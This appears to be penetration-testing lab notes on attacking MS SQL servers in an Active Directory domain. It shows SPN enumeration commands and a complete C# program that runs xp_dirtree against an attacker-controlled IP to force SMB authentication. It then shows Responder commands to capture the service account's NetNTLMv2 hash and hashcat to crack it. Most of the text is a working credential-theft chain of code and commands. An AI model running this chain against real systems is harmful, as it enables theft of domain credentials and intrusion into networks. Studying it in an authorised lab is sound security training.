SQL ENUMERATION
-----------------------
When a MS SQL server is running in the context of an Active Directory service account, it is normally associated with a Service Principal Name (SPN).

To locate instances of MS SQL in an Active Directory query the domain controller for all registered SPNs related to MS SQL.

Query with with native tool setspn:

```setspn -T corp1 -Q MSSQLSvc/*```

Do the same thing through .NET framework using a powershell script:

`C:\Tools\GetUserSPNs.ps1`

UNC INJECTION
------------------

If we use our unprivileged access in the database to execute the `xp_dirtree` procedure, the service account of the SQL server will attempt to list the contents of a given SMB share. A SMB share is typically supplied with a Universal Naming Convention (**UNC**) path, The format is:
`\\hostname\folder\file`

```
using System;
using System.Data.SqlClient;
namespace SQL
{
	class Program
	{
		static void Main(string[] args)
		{
			String sqlServer = "dc01.corp1.com";
			String database = "master";
			String conString = "Server = " + sqlServer + "; Database = " + database +
		"; Integrated Security = True;";
			SqlConnection con = new SqlConnection(conString);
			
		try
		{
			con.Open();
			Console.WriteLine("Auth success!");
		}
		catch
		{
			Console.WriteLine("Auth failed");
			Environment.Exit(0);
		}
		String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
		SqlCommand command = new SqlCommand(query, con);
		SqlDataReader reader = command.ExecuteReader();
		reader.Close();
		con.Close();
		}
	}
}
```

Now shutdown samba share on kali and use responder to capture the hash:
`sudo responder -I tap0`

Crack the hash:
`hashcat -m 5600 hash.txt dict.txt --force`